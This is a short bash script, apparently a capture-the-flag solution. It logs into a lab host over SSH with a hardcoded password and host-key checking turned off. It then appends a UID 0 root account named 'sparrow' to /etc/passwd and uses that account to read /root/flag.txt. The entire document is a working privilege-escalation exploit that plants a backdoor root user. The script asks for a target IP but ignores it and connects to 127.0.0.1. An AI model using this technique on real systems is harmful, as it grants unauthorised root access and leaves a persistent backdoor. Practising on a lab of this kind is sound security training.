#!/bin/bash

generated_passwd=$(openssl passwd -1 -salt sparrow sparrow)
passwd="sparrow:$generated_passwd:0:0:Sparrow:/root:/bin/bash"

if [ -z "$1" ]
then
    echo "No IP supplied. Please provide the target IP address!"
else
    ip=$1
    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@127.0.0.1 -p 2022 "echo $passwd >> /etc/passwd && echo "sparrow" | su -c \"cat /root/flag.txt\" sparrow"
fi